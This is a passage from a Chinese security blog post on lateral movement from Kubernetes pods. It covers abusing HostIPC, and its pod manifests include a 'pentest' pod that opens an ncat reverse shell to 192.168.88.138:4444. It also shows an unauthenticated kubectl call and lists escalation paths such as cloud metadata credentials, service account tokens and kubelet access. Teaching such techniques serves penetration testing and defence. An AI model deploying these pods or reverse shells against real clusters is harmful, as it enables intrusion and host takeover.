+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl -s http://192.168.88.137:8080 get nodes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="47-开放-hostipc-权限">4.7 开放 HostIPC 权限</h3>
+<p>IPC 命名空间是一种在同一台主机上运行的进程之间进行进程间通信（IPC）的机制。通过设置 <code>HostIPC</code> 权限，可以控制 Pod 是否可以与主机上的其他进程共享 IPC 命名空间。在 Kubernetes 中，每个 Pod 都有自己的 IPC 命名空间，Pod 内的进程只能与同一 Pod 内的其他进程进行 IPC，而不能直接与主机上的进程进行 IPC。</p>
+<p>如果将 <code>HostIPC</code> 设置为 <code>true</code>，则表示该 Pod 具有访问主机 IPC 命名空间的权限， Pod 内的进程可以与主机上的其他进程共享 IPC 命名空间，从而可能影响主机上的其他进程。</p>
+<p>如果主机上的任何进程或 pod 中的任何进程使用了主机的进程间通信机制（共享内存、信号数组、消息队列等），攻击者可以读/写这些机制。有如下几种方法谢谢 </p>
+<ul>
+<li>查看 <code>/dev/shm</code> - 查看在这个共享内存位置是否存在任何文件。</li>
+<li>查看现有 IPC 设施 - 可以使用 <code>/usr/bin/ipcs</code> 检查是否有 IPC 正在使用。</li>
+</ul>
+<p>创建 Pods：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostipc-only</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostIPC</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostipc-only</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果我们所在的 pods 没有 <code>pods/exec</code> 权限，可以采取反弹 shell 的方式获取 shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostipc-only-reverse</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">pentest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostIPC</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">hostipc-only-reverse</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">raesene/ncat</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;ncat 192.168.88.138 4444 -e /bin/bash;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="48-无任何权限">4.8 无任何权限</h3>
+<p>在这种场景下，思路就比较常规了，可以参考<a href="https://www.geekby.site/2021/11/k8s%e5%ae%89%e5%85%a8/" title="我的这篇文章" target="_blank" rel="noopener noreffer">我的这篇文章</a>，通常有以下几种方式：</p>
+<ul>
+<li>访问云上 metadata 信息：如果 Pod 是在云上托管的，可以尝试访问 metadata 信息，可能会有一些 IAM 凭据或 STS token 等。</li>
+<li>权限配置不当的 <code>serviceaccount</code>：如果命名空间的默认服务账户被挂载到 Pod 中的 <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>，并且权限设置过大，可以使用该令牌提升权限。</li>
+<li>未授权漏洞：集群内api-server 未授权、kubelet 未授权等。</li>
+<li>内核漏洞或 k8s 漏洞：如 CVE-2018-1002105。</li>
+<li>应用漏洞：寻找 pod 内启动的应用自身漏洞。</li>
+</ul>
+<h1 id="5-参考">5 参考</h1>
+<p><a href="https://chat.openai.com/" title="https://chat.openai.com/" target="_blank" rel="noopener noreffer">https://chat.openai.com/</a></p>
+<p><a href="https://tttang.com/archive/1465/" title="https://tttang.com/archive/1465/" target="_blank" rel="noopener noreffer">https://tttang.com/archive/1465/</a></p>
+<p><a href="https://blog.csdn.net/u012986012/article/details/122712572" title="https://blog.csdn.net/u012986012/article/details/122712572" target="_blank" rel="noopener noreffer">https://blog.csdn.net/u012986012/article/details/122712572</a></p>
+<p><a href="https://github.com/kvaps/kubectl-node-shell" title="https://github.com/kvaps/kubectl-node-shell" target="_blank" rel="noopener noreffer">https://github.com/kvaps/kubectl-node-shell</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-11-29</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-title="Kubernetes Pod 横向移动"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-title="Kubernetes Pod 横向移动"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-title="Kubernetes Pod 横向移动"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">云原生安全</a>,&nbsp;<a href="/tags/k8s/">k8s</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/" class="prev" rel="prev" title="RSAC议题解读-云上跨租户漏洞攻击面分析"><i class="fas fa-angle-left fa-fw"></i>RSAC议题解读-云上跨租户漏洞攻击面分析</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
